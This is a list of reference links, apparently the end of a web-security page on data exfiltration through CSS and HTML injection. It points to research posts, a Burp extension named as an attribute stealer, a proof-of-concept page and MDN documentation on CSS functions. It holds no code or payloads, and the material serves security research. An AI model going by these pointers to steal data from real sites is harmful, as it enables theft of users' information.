- [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
- [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
- [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
- [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)
- [Inline Style Exfiltration: leaking data with chained CSS conditionals (PortSwigger)](https://portswigger.net/research/inline-style-exfiltration)
- [InlineStyleAttributeStealer.bambda (Burp Custom Action)](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda)
- [PoC page for inline-style exfiltration](https://portswigger-labs.net/inline-style-exfiltration-ff1072wu/test.php)
- [MDN: CSS if() conditional](https://developer.mozilla.org/en-US/docs/Web/CSS/if)
- [MDN: CSS attr() function](https://developer.mozilla.org/en-US/docs/Web/CSS/attr)
- [MDN: image-set()](https://developer.mozilla.org/en-US/docs/Web/CSS/image/image-set)

{{#include ../../../banners/hacktricks-training.md}}
